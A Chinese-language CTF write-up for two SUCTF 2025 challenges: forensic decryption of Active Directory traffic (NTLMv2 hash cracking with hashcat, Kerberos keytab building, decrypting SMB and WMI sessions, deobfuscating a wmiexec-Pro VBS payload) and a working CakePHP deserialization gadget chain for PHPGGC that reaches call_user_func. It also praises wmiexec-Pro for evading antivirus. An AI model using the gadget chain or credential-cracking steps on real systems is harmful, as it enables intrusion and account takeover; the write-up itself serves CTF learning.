---
title: "SUCTF 2025 SU_AD && SU_POP 题解"
slug: "suctf-2025-su-ad-su-pop"
date: 2025-02-25T15:47:40+08:00
draft: false
tags: ["SUCTF", "流量分析", "Active Directory", "PHP", "反序列化"]
categories: ["CTF"]
description: "SUCTF 2025 出题记录：域流量取证与 CakePHP 反序列化利用链。"
tocOpen: true
---

本文记录 SUCTF 2025 的两道题：SU_AD 从域认证与远程执行流量中还原线索，SU_POP 则考察 CakePHP 反序列化利用链。

## SU_AD

这道题围绕域流量取证展开：从 NetNTLMv2 认证恢复用户口令，再解密 Kerberos、SMB 和 WMI 流量。

### SharpADWS

分析[@whoami](https://whoamianony.top/) 师傅工具 SharpADWS 在流量侧 表现

参考演讲稿，又是膜拜学习的一天啊

https://xz.aliyun.com/t/16378?time\_\_1311\=GuD%3D0KAKBIPGx0Heeu4QuEWDRQT5v6%3DAox

![SU_AD 流量分析截图 1](figure-01.png)

![SU_AD 流量分析截图 2](figure-02.png)

使用了NetNTLMv2 协议 进行认证，尝试爆破sk用户的密码，可以参考2024强网杯的谍影重重

```Bash
$ tshark -n -r adws-1.pcapng -Y 'ntlmssp.messagetype == 0x00000003' -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmv2_response.ntproofstr -e ntlmssp.auth.ntresponse
Warning: program compiled against libxml 212 using older 209
sk      sk.com  0233f3f42302daa392aee9bb52a6887c        0233f3f42302daa392aee9bb52a6887c01010000000000003c313dc4b762db01592cc51070da966d000000000200040053004b00010004004400430004000c0073006b002e0063006f006d0003001200440043002e0073006b002e0063006f006d0005000c0073006b002e0063006f006d00070008003c313dc4b762db0106000400020000000800300030000000000000000100000000200000a6b014bf8a1f09368502041ded7fceb82c8ed41c09c2d199ee04b8421f0b0e9c0a001000000000000000000000000000000000000900160068006f00730074002f0073006b002e0063006f006d000000000000000000
sk      sk.com  3d83dd54cff0f77715b97e7ae985813f        3d83dd54cff0f77715b97e7ae985813f01010000000000002d2c49c4b762db014a8fd14f8291865d000000000200040053004b00010004004400430004000c0073006b002e0063006f006d0003001200440043002e0073006b002e0063006f006d0005000c0073006b002e0063006f006d00070008002d2c49c4b762db0106000400020000000800300030000000000000000100000000200000a6b014bf8a1f09368502041ded7fceb82c8ed41c09c2d199ee04b8421f0b0e9c0a001000000000000000000000000000000000000900160068006f00730074002f0073006b002e0063006f006d000000000000000000
$ tshark -n -r adws-1.pcapng -Y 'ntlmssp.messagetype == 0x00000002'  -T fields -e ntlmssp.ntlmserverchallenge
Warning: program compiled against libxml 212 using older 209
a780092344838bb2
b7325db726cdddbe
$ cat ntlm_hash.txt
sk::sk.com:a780092344838bb2:0233f3f42302daa392aee9bb52a6887c:01010000000000003c313dc4b762db01592cc51070da966d000000000200040053004b00010004004400430004000c0073006b002e0063006f006d0003001200440043002e0073006b002e0063006f006d0005000c0073006b002e0063006f006d00070008003c313dc4b762db0106000400020000000800300030000000000000000100000000200000a6b014bf8a1f09368502041ded7fceb82c8ed41c09c2d199ee04b8421f0b0e9c0a001000000000000000000000000000000000000900160068006f00730074002f0073006b002e0063006f006d000000000000000000
$ hashcat -a 0 -m 5600 D:\Projects\MyCTFProjects\SU_AD\ntlm_hash.txt D:\Tools\Wordlists\rockyou.txt

Eminem01
```

制作keytab，可以参考[PTS2023-Talk-20-Decrypt_Kerberos_NTLM_with_Wireshark.pdf](https://archives.pass-the-salt.org/Pass%20the%20SALT/2023/slides/PTS2023-Talk-20-Decrypt_Kerberos_NTLM_with_Wireshark.pdf)

![SU_AD 流量分析截图 3](figure-03.png)

```Python
from struct import unpack, pack
from impacket.structure import Structure
import binascii
import sys

# Keytab structure from http://www.ioplex.com/utilities/keytab.txt
  # keytab {
  #     uint16_t file_format_version;                    /* 0x502 */
  #     keytab_entry entries[*];
  # };

  # keytab_entry {
  #     int32_t size;
  #     uint16_t num_components;    /* sub 1 if version 0x501 */
  #     counted_octet_string realm;
  #     counted_octet_string components[num_components];
  #     uint32_t name_type;   /* not present if version 0x501 */
  #     uint32_t timestamp;
  #     uint8_t vno8;
  #     keyblock key;
  #     uint32_t vno; /* only present if >= 4 bytes left in entry */
  # };

  # counted_octet_string {
  #     uint16_t length;
  #     uint8_t data[length];
  # };

  # keyblock {
  #     uint16_t type;
  #     counted_octet_string;
  # };

class KeyTab(Structure):
    structure = (
        ('file_format_version','H=517'),
        ('keytab_entry', ':')
    )
    def fromString(self, data):
        self.entries = []
        Structure.fromString(self, data)
        data = self['keytab_entry']
        while len(data) != 0:
            ktentry = KeyTabEntry(data)

            data = data[len(ktentry.getData()):]
            self.entries.append(ktentry)

    def getData(self):
        self['keytab_entry'] = b''.join([entry.getData() for entry in self.entries])
        data = Structure.getData(self)
        return data

class OctetString(Structure):
    structure = (
        ('len', '>H-value'),
        ('value', ':')
    )

class KeyTabContentRest(Structure):
    structure = (
        ('name_type', '>I=1'),
        ('timestamp', '>I=0'),
        ('vno8', 'B=2'),
        ('keytype', '>H'),
        ('keylen', '>H-key'),
        ('key', ':')
    )

class KeyTabContent(Structure):
    structure = (
        ('num_components', '>h'),
        ('realmlen', '>h-realm'),
        ('realm', ':'),
        ('components', ':'),
        ('restdata',':')
    )
    def fromString(self, data):
        self.components = []
        Structure.fromString(self, data)
        data = self['components']
        for i in range(self['num_components']):
            ktentry = OctetString(data)

            data = data[ktentry['len']+2:]
            self.components.append(ktentry)
        self.restfields = KeyTabContentRest(data)

    def getData(self):
        self['num_components'] = len(self.components)
        # We modify the data field to be able to use the
        # parent class parsing
        self['components'] = b''.join([component.getData() for component in self.components])
        self['restdata'] = self.restfields.getData()
        data = Structure.getData(self)
        return data

class KeyTabEntry(Structure):
    structure = (
        ('size','>I-content'),
        ('content',':', KeyTabContent)
    )

# Add your own keys here!
# Keys are tuples in the form (keytype, 'hexencodedkey')
# Common keytypes for Windows:
# 23: RC4
# 18: AES-256
# 17: AES-128
# Wireshark takes any number of keys in the keytab, so feel free to add
# krbtgt keys, service keys, trust keys etc
keys = [
   (23, '97b536419f4e41689f8d4f45523597a2'),
]

nkt = KeyTab()
nkt.entries = []

for key in keys:
    ktcr = KeyTabContentRest()
    ktcr['keytype'] = key[0]
    ktcr['key'] = binascii.unhexlify(key[1])
    nktcontent = KeyTabContent()
    nktcontent.restfields = ktcr
    # The realm here doesn't matter for wireshark but does of course for a real keytab
    nktcontent['realm'] = b'sequel.htb'.upper()
    krbtgt = OctetString()
    krbtgt['value'] = 'krbtgt'
    nktcontent.components = [krbtgt]
    nktentry = KeyTabEntry()
    nktentry['content'] = nktcontent
    nkt.entries.append(nktentry)

data = nkt.getData()
if len(sys.argv) < 2:
    print('Usage: keytab.py <outputfile>')
    print('Keys should be written to the source manually')
else:
    with open(sys.argv[1], 'wb') as outfile:
        outfile.write(data)
```

![SU_AD 流量分析截图 4](figure-04.png)

熟悉 DACL 滥用的师傅们都知道，这是个强制改密的操作，可以参考https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword

![SU_AD 流量分析截图 5](figure-05.png)

参考bloodyAD项目，其实就是替换了关键属性unicodePwd的值

PS：

在 SharpADWS 项目中 不存在 强制改密的操作，我手动实现了一个

![SU_AD 流量分析截图 6](figure-06.png)

至此获得administrator 密码 1202)78M5CcE\=+!2

![SU_AD 流量分析截图 7](figure-07.png)

### Psexec-kerbero

Impacket 我只能说伟大，无需多言！

不过我这里的psexec 脚本产生的smb流量，都是通过kerberos 协议认证过的，建议参考 [微软官方文档](https://learn.microsoft.com/en-us/archive/blogs/openspecification/smb-2-and-smb-3-security-in-windows-10-the-anatomy-of-signing-and-cryptographic-keys) ，获知kerberos 和 ntlm 身份认证协议 在 smb3 协议上的不同

![SU_AD 流量分析截图 8](figure-08.png)

继续制作keytab，用如下脚本生成administrator 用户 的 AES-256 密钥，主要参考[impacket脚本](https://github.com/fortra/impacket/blob/bfa7b939f8af47d4205531eddf0d5696be655d88/impacket/krb5/kerberosv5.py#L260)

```Python
import random

from impacket.krb5.crypto import _enctype_table

# Our random number generator
try:
    rand = random.SystemRandom()
except NotImplementedError:
    rand = random
    pass

if __name__ == '__main__':
    enctype = 18
    cipher = _enctype_table[enctype]
    key = cipher.string_to_key('1202)78M5CcE=+!2', b'SK.COMAdministrator', None)
    print(key.contents.hex())
```

![SU_AD 流量分析截图 9](figure-09.png)

![SU_AD 流量分析截图 10](figure-10.png)

此时终于能看见ServiceSessionKey了，但wireshark 并没有实现kerbeeros 认证下的 smb 流量自动解密，需要手动添加解开

![SU_AD 流量分析截图 11](figure-11.png)

![SU_AD 流量分析截图 12](figure-12.png)

![SU_AD 流量分析截图 13](figure-13.png)

![SU_AD 流量分析截图 14](figure-14.png)

### wmiexec-Pro

强烈推荐wmiexec-Pro ，横向移动绕过杀软，非常好使！！！

这里分析它如何执行命令的，可以清晰看到是通过WMI 事件订阅远程执行VBS脚本，此时VBS 脚本还没有进行混淆t

![SU_AD 流量分析截图 15](figure-15.png)

通过generator 函数 进行 混淆

![SU_AD 流量分析截图 16](figure-16.png)

将[混淆字符串](wmi-obfuscated.txt)下载到脚本所在目录，再运行以下脚本恢复 VBS 原文：

```Python
# 假设初始化的字符串
from pathlib import Path
DgtsBdJtEpjIlKMcvpKuMkflhSPGhjk = Path("wmi-obfuscated.txt").read_text().strip()
# 分割符号，先进行计算，再转换为字符
delimiter = chr(int(412650 / 9825))  # 强制转换为整数

# 使用 Python 的 split 方法来模拟 VBScript 的 Split
tgCkvHzLfnluUjonbpHlONFeuZDEhZM = DgtsBdJtEpjIlKMcvpKuMkflhSPGhjk.split(delimiter)

PFdUCUBuebAkdpolqLKtaWRPdRgMinr = ""
# 遍历数组并拼接字符串
for ovAMSOWhTVsIBXdbZCDgELLDJUWTVRN in tgCkvHzLfnluUjonbpHlONFeuZDEhZM:
    PFdUCUBuebAkdpolqLKtaWRPdRgMinr = PFdUCUBuebAkdpolqLKtaWRPdRgMinr + chr(int(eval(ovAMSOWhTVsIBXdbZCDgELLDJUWTVRN)))

# 输出最终结果
print(PFdUCUBuebAkdpolqLKtaWRPdRgMinr)
```

![SU_AD 流量分析截图 17](figure-17.png)

![SU_AD 流量分析截图 18](figure-18.png)

用之前制作好的keytab，就可以解密流量

![SU_AD 流量分析截图 19](figure-19.png)

获得密码解开压缩包即可获得FLAG

![SU_AD 流量分析截图 20](figure-20.png)

最后感谢[@whoami](https://whoamianony.top/) 和 [@eson](https://eson.ninja/) 在我学习域渗透的时候给予的帮助

## SU_POP

### 反序列化入口与利用链

题目通过 `ser` 查询参数接收 Base64 编码的序列化数据，解码后直接调用 `unserialize`。利用入口是 `React\Promise\Internal\RejectedPromise`，通过 Composer 的 `Pool` 和 CakePHP 的 `MapReduce` 将可控参数传给 `call_user_func`。

析构时，未处理的 `RejectedPromise` 会把 `reason` 拼进错误信息，触发 `Pool::__toString()`。后者遍历 `packages` 时，`MapReduce::getIterator()` 执行 mapper，最终以数组的值和键作为回调参数。题目中的对象由反序列化恢复，因此可以设置这些属性并绕过正常构造函数的参数约束。

想出个框架的POP链挖掘的题，就打开PHPGGC 发现cakephp 好久没更新，就顺手挖一下

我看了一下大家的WP，入口点都是一样的RejectedPromise class

在这里我也贴一下自己的payload

参考：[CakePHP POP 链分析](https://forum.butian.net/share/2411)

下面两段分别是 PHPGGC 的链定义和用于生成序列化对象的类桩，需放入 PHPGGC 对应的 gadget 目录中使用。

```PHP
<?php

namespace GadgetChain\CakePHP;


class RCE7 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = 'new';
    public static $vector = '__destruct';
    public static $author = 'shukuang';

    public function generate(array $parameters)
    {
        $a = [$parameters["parameter"] => $parameters["function"]];
        $b = new \Cake\Collection\Iterator\MapReduce(false, "call_user_func", $a);
        $c = new \Composer\DependencyResolver\Pool($b);
        $d = new \React\Promise\Internal\RejectedPromise($c);
        return $d;
    }
}
```

```PHP
<?php

namespace Seld\Signal {
    final class SignalHandler
    {
        private $signals;

        public function __construct($signals)
        {
            $this->signals = $signals;
        }
    }
}


namespace Cake\Collection\Iterator {

    class MapReduce
    {
        protected bool $_executed;
        protected $_mapper;
        protected iterable $_data;

        public function __construct($_executed, $mapper, $_data)
        {
            $this->_executed = $_executed;
            $this->_mapper = $mapper;
            $this->_data = $_data;
        }
    }
}

namespace Composer\DependencyResolver {
    class Pool
    {
        protected $packages;

        public function __construct($packages)
        {
            $this->packages = $packages;
        }
    }
}


namespace React\Promise\Internal {
    class RejectedPromise
    {
        private $handled;
        private $reason;

        public function __construct($reason)
        {
            $this->handled = false;
            $this->reason = $reason;
        }
    }
}
```
